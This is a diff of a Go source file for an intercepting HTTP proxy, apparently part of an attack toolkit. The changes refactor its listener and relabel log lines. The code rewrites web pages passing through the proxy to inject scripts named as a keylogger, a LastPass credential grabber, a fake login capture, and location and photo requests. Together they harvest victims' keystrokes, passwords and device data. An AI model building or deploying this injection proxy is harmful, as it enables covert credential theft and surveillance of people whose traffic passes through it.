@@ -1,26 +1,15 @@
 package controllers
 
 import (
-    // "github.com/elazarl/goproxy"
     "github.com/abourget/goproxy"
-    // "github.com/abourget/goproxy/ext/image"
-    // "image"
-    // "image/jpeg"
     "log"
-    "net"
     "net/http"
     "strings"
     "bytes"
-    // "os"
-    // "io"
     "io/ioutil"
     "crypto/tls"
     "time"
 )
-
-
-// -----------------------------------------------------------------------------------------
-
 
 const (
     CONN_HOST = "0.0.0.0"
@@ -34,9 +23,6 @@ const (
     INJECT_LASTPASS_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
     INJECT_LOGIN_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/login.js\"></script></body>"
 )
-
-var listener net.Listener
-
 // Provide booleans for each function
 var globalStoreHAR bool
 var globalRedirects bool
@@ -49,12 +35,7 @@ var globalInjectGetLogin bool
 var globalInjectLastpass bool
 var globalProxyStandard bool
 
-// -----------------------------------------------------------------------------------------
-
-
 func StartSimpleProxy() {
-
-    globalStoreHAR = false
 
     log.Println(" >>> STARTING PROXY SERVER")
     log.Println("     --- OPTION storing HAR ", globalStoreHAR )
@@ -66,12 +47,8 @@ func StartSimpleProxy() {
     log.Println("     --- OPTION inject Photo Request ", globalInjectGetPhoto )
     log.Println("     --- OPTION inject Location Request ", globalInjectGetLocation )
     log.Println("     --- OPTION inject Request Lastpass ", globalInjectLastpass )
-
-    listener, err := net.Listen(CONN_TYPE, CONN_HOST + ":" + CONN_PORT) 
-    if err != nil {
-        log.Println("error here: ", err)
-    }    
-
+ 
+    stoppableListener, _ = New(listener) //create a stoppable listener from the listener
     // Start the proxy.
     proxy := goproxy.NewProxyHttpServer()
 
@@ -98,7 +75,7 @@ func StartSimpleProxy() {
             if ctx.SNIHost() != "" {
                 log.Println(" *** HTTPS Connection: ", ctx.SNIHost())
                 //return goproxy.MITM // This is failing...
-                return goproxy.FORWARD
+                return goproxy.NEXT
             }
             return goproxy.FORWARD
         })
@@ -153,27 +130,27 @@ func StartSimpleProxy() {
             }
             body := string(bs) //needs to be a string for reading
             if globalInjectKeyLogger {
-                log.Println("INJECTING")
+                log.Println("INJECTING Keylogger")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGGER_RESULT )
             }
             if globalInjectGetLocation {
-                log.Println("INJECTING")
+                log.Println("INJECTING Location")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOCATION_RESULT )
             }
             if globalInjectGetPhoto {
-                log.Println("INJECTING")
+                log.Println("INJECTING Photo")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_PHOTO_RESULT )
             }
             if globalInjectGetLogin {
-                log.Println("INJECTING")
+                log.Println("INJECTING Login")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LOGIN_RESULT )
             }
             if globalInjectLastpass {
-                log.Println("INJECTING")
+                log.Println("INJECTING Lastpass")
                 utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
                 body = utilsInjector( body, INJECT_LOGGER_REPLACE, INJECT_LASTPASS_RESULT )
             }
@@ -184,9 +161,12 @@ func StartSimpleProxy() {
         proxy.HandleResponse(interceptResponse)
     }
 
-    go http.Serve(listener, proxy)
-    
-    // return listener
+    go func() {
+        wg.Add(1)
+        defer wg.Done()
+        http.Serve(stoppableListener, proxy)
+    }()
+
 }
 
 
@@ -250,9 +230,9 @@ func TriggerWolfPack() goproxy.HandlerFunc {
                 if err != nil {
                     log.Println(" help!: ", err)
                 }
-                log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))
+                // log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))
 
-                log.Println(server_ssl_response.TLS)
+                // log.Println(server_ssl_response.TLS)
                 bs, err := ioutil.ReadAll(server_ssl_response.Body)
                 if err != nil {
                     log.Println(err)
@@ -292,60 +272,3 @@ func TriggerWolfPack() goproxy.HandlerFunc {
     }) // end of the proxy OnResponse.
     return interceptResponse
 }
-
-
-
-// -----------------------------------------------------------------------------------------
-
-
-
-
-
-
-
-
-
-
-// //ERROR: issue is it doesnt recognise the image type
-// func ReplaceImages() net.Listener {
-//     listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
-//     image.RegisterFormat("jpeg", "jpeg", jpeg.Decode, jpeg.DecodeConfig)
-//     log.Println("Replacing images")
-//     decoded, _ := os.Open(fileLocation+"/decoded.jpg")
-//     defer decoded.Close()
-//     proxy := goproxy.NewProxyHttpServer()
-
-//     proxy.Verbose = false
-//     go http.Serve(listener, proxy) // you can probably ignore this error
-//     return listener
-// }
-
-
-
-
-
-
-// func FlipImages() net.Listener {
-//     listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
-//     proxy := goproxy.NewProxyHttpServer()
-//     interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
-//         log.Println("URL: ", ctx.Resp.Request.URL)
-//         log.Println("interceptor")
-//         goproxy_image.HandleImage(func(img image.Image, ctx *goproxy.ProxyCtx) image.Image {
-//             dx, dy := img.Bounds().Dx(), img.Bounds().Dy()
-//             log.Println("image")
-//             nimg := image.NewRGBA(img.Bounds())
-//             for i := 0; i < dx; i++ {
-//                 for j := 0; j <= dy; j++ {
-//                     nimg.Set(i, j, img.At(i, dy-j-1))
-//                 }
-//             }
-//             return nimg
-//         })
-//         return goproxy.DONE
-//     })
-//     proxy.HandleResponse(interceptResponse)
-//     go http.Serve(listener, proxy) // you can probably ignore this error
-//     return listener
-// }
-
